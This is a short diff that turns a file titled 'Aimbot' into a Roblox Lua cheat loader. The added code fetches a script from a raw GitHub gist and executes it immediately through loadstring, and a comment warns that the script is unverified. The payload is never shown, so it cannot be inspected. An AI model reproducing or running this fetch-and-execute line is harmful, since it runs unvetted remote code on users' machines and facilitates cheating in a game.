@@ -1,1 +1,4 @@
-# Aimbot
+--[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+loadstring(game:HttpGet("https://gist.githubusercontent.com/ahmedmahmoudawaysali123456789-sys/318d4a973c5158e6d41092cc9fea75ec/raw"))()
